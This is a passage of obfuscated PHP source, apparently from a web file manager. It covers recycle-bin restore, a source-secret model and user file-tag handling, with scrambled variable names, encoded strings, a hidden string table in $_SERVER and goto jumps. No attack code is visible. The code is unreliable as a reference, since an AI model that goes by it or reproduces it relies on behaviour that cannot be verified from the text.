{ continue; } $›‚ÊÀÙ = $Ó–ÒíÖÚ->sourceInfo($’Ëß›˜ß); $’“±à•ş = $Ó–ÒíÖÚ->sourceInfo($›‚ÊÀÙ[$¨Øş¯¶[193]]); if ($’“±à•ş[$¨Øş¯¶[516]] == $¨Øş¯¶[91]) { continue; } $Ó–ÒíÖÚ->lockMoveStart($’Ëß›˜ß); $this->recycleMove($’Ëß›˜ß, 0); if ($›‚ÊÀÙ[$¨Øş¯¶[496]] == $¨Øş¯¶[91]) { $œÚÉ‚ª = array($¨Øş¯¶[668] => array($¨Øş¯¶[628], $›‚ÊÀÙ[$¨Øş¯¶[597]] . $’Ëß›˜ß . $¨Øş¯¶[629])); $Ó–ÒíÖÚ->where($œÚÉ‚ª)->setField($¨Øş¯¶[516], 0); $this->restoreFolderChildren($’Ëß›˜ß, $Âøí¬Šš); } $this->where(array($¨Øş¯¶[194] => $’Ëß›˜ß))->delete(); $Ó–ÒíÖÚ->folderSizeReset($›‚ÊÀÙ[$¨Øş¯¶[193]]); $§ƒÜµé¤[] = $›‚ÊÀÙ[$¨Øş¯¶[193]]; if ($›‚ÊÀÙ[$¨Øş¯¶[496]] == $¨Øş¯¶[91]) { $§ƒÜµé¤[] = $’Ëß›˜ß; } $Ó–ÒíÖÚ->lockMoveEnd($’Ëß›˜ß); } $Ó–ÒíÖÚ->updateModifyTime($§ƒÜµé¤); } private function restoreFolderChildren($¨ãøé, $ÎÀ÷œŠ) { $òíÛ‘ää =& $_SERVER[äô®•½Â]; $”Èß³¤÷ = Model($òíÛ‘ää[1426]); $‰â×à½¢ = array($òíÛ‘ää[194] => array($òíÛ‘ää[7], array())); foreach ($ÎÀ÷œŠ as $áù¤Ø÷ä) { if ($áù¤Ø÷ä == $¨ãøé) { continue; } if (!$”Èß³¤÷->isParentOf($¨ãøé, $áù¤Ø÷ä)) { continue; } $„‘”ï Ä = $”Èß³¤÷->sourceInfo($áù¤Ø÷ä); if ($„‘”ï Ä[$òíÛ‘ää[496]] == $òíÛ‘ää[91]) { $‰â×à½¢[] = array($òíÛ‘ää[668] => array($òíÛ‘ää[628], $„‘”ï Ä[$òíÛ‘ää[597]] . $áù¤Ø÷ä . $òíÛ‘ää[629])); } else { $‰â×à½¢[$òíÛ‘ää[194]][1][] = $áù¤Ø÷ä; } } if (!$‰â×à½¢[$òíÛ‘ää[194]][1]) { unset($‰â×à½¢[$òíÛ‘ää[194]]); } if (!$‰â×à½¢) { return; } if (is_array($‰â×à½¢[$òíÛ‘ää[194]]) && is_array($‰â×à½¢[$òíÛ‘ää[194]][1])) { $‰â×à½¢[$òíÛ‘ää[194]][1] = array_unique($‰â×à½¢[$òíÛ‘ää[194]][1]); } $‰â×à½¢[$òíÛ‘ää[1072]] = $òíÛ‘ää[2080]; $”Èß³¤÷->where($‰â×à½¢)->setField($òíÛ‘ää[516], 1); } private function recycleMove($ªÇÌçñ­, $ú–ô×ù“ = 1) { $Ñ£ëç¦ú =& $_SERVER[äô®•½Â]; $‘­ÆÌÒ™ = Model($Ñ£ëç¦ú[1426]); $•îêÇ = Model($Ñ£ëç¦ú[2312]); $ÄĞ€Øñ• = array($Ñ£ëç¦ú[194] => $ªÇÌçñ­); if ($ú–ô×ù“) { $‘­ÆÌÒ™->where($ÄĞ€Øñ•)->setField($Ñ£ëç¦ú[516], 1); $•îêÇ->eventRecycle($ªÇÌçñ­, $Ñ£ëç¦ú[2313]); } else { $ïŒÒíÓ = $‘­ÆÌÒ™->where($ÄĞ€Øñ•)->find(); $„Æ­˜Ç¶ = $ïŒÒíÓ[$Ñ£ëç¦ú[496]] == $Ñ£ëç¦ú[91]; $ÖÊ …¨ = $‘­ÆÌÒ™->fileNameAuto($ïŒÒíÓ[$Ñ£ëç¦ú[193]], $ïŒÒíÓ[$Ñ£ëç¦ú[32]], REPEAT_RENAME_FOLDER, $„Æ­˜Ç¶); if ($ÖÊ …¨ != $ïŒÒíÓ[$Ñ£ëç¦ú[32]]) { $‘­ÆÌÒ™->rename($ªÇÌçñ­, $ÖÊ …¨); } $‘­ÆÌÒ™->where($ÄĞ€Øñ•)->setField($Ñ£ëç¦ú[516], 0); $•îêÇ->eventRecycle($ªÇÌçñ­, $Ñ£ëç¦ú[2314]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\171\x73\164\x65\x6d\x2e\163\157\165\162\143\x65\x53\145\x63\162\x65\x74\114\x69\163\164"; public $field = array("\163\157\x75\x72\x63\x65\x49\104", "\164\x79\160\145\x49\x44", "\143\x72\x65\141\164\x65\125\x73\145\x72"); } goto E°ÃØô×“«; DÊøó¾‡Ùã: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\162\x5f\x66\141\166"; protected function cacheFunctionAlias($Ì•µÜ¤) { $¨ŞÒ‹å± =& $_SERVER[äô®•½Â]; return array($¨ŞÒ‹å±[2093] => array($¨ŞÒ‹å±[2527] . USER_ID, $¨ŞÒ‹å±[2094])); } protected function listData() { $«å°ü«è =& $_SERVER[äô®•½Â]; $éÀÒ’Ñã = array($«å°ü«è[1768] => USER_ID, $«å°ü«è[570] => array($«å°ü«è[2097], 0)); $”§µÌâ¬ = $«å°ü«è[2528]; $‹»É×ªÔ = $this->field($”§µÌâ¬)->where($éÀÒ’Ñã)->order($«å°ü«è[2099])->select(); return $‹»É×ªÔ ? $‹»É×ªÔ : array(); } protected function addToTag($ÕÒÄ«œ–, $ŸœŠ§­) { $ÑñÅş‰Ó =& $_SERVER[äô®•½Â]; if (!Model($ÑñÅş‰Ó[2250])->listData($ŸœŠ§­)) { return !1; } if (is_numeric($ÕÒÄ«œ–)) { $Âß·ö‰ñ = Model($ÑñÅş‰Ó[896])->pathInfo($ÕÒÄ«œ–); if (!$Âß·ö‰ñ) { return !1; } } else { $Âß·ö‰ñ = IO::infoSimple($ÕÒÄ«œ–); if (!$Âß·ö‰ñ) { return !1; } $‚ğïêÄ = $Âß·ö‰ñ[$ÑñÅş‰Ó[32]]; $“®öâô‹ = $Âß·ö‰ñ[$ÑñÅş‰Ó[33]]; if (isset($Âß·ö‰ñ[$ÑñÅş‰Ó[496]])) { $“®öâô‹ = $Âß·ö‰ñ[$ÑñÅş‰Ó[496]] == $ÑñÅş‰Ó[91] ? $ÑñÅş‰Ó[78] : $ÑñÅş‰Ó[233]; } } $Œ¢Îªâú = array($ÑñÅş‰Ó[1768] => USER_ID, $ÑñÅş‰Ó[570] => $ŸœŠ§­, $ÑñÅş‰Ó[506] => $ÕÒÄ«œ–, $ÑñÅş‰Ó[507] => $“®öâô‹ ? $“®öâô‹ : $ÑñÅş‰Ó[501], $ÑñÅş‰Ó[505] => $‚ğïêÄ ? $‚ğïêÄ : $ÑñÅş‰Ó[12], $ÑñÅş‰Ó[1981] => 0); if ($this->where($Œ¢Îªâú)->find()) { return !1; } return $this->add($Œ¢Îªâú); } protected function removeFromTag($Šö³÷¤Á, $©†ïˆß) { $¶ìğì…± =& $_SERVER[äô®•½Â]; if (!Model($¶ìğì…±[2250])->listData($©†ïˆß)) { return !1; } if (is_array($Šö³÷¤Á)) { $Šö³÷¤Á = array($¶ìğì…±[7], $Šö³÷¤Á); } $š±ùƒıº = array($¶ìğì…±[1768] => USER_ID, $¶ìğì…±[570] => $©†ïˆß, $¶ìğì…±[506] => $Šö³÷¤Á); return $this->where($š±ùƒıº)->delete(); } protected function removeByTag($è„¹İ“) { $“ÖùòÆš =& $_SERVER[äô®•½Â]; if (!$è„¹İ“) { return !1; } $§Ä«‡Êœ = array($“ÖùòÆš[1768] => USER_ID, $“ÖùòÆš[570] => $è„¹İ“); return $this->where($§Ä«‡Êœ)->delete(); } protected function removeBySource($•ĞÎà‚«) { $ß®ß»ûË =& $_SERVER[äô®•½Â]; if (is_array($•ĞÎà‚«)) { $•ĞÎà‚« = array($ß®ß»ûË[7], $•ĞÎà‚«); } $ß±ëŞõ = array($ß®ß»ûË[1768] => USER_ID, $ß®ß»ûË[570] => array($ß®ß»ûË[1086], 0), $ß®ß»ûË[506] => $•ĞÎà‚«); return $this->where($ß±ëŞõ)->delete(); } }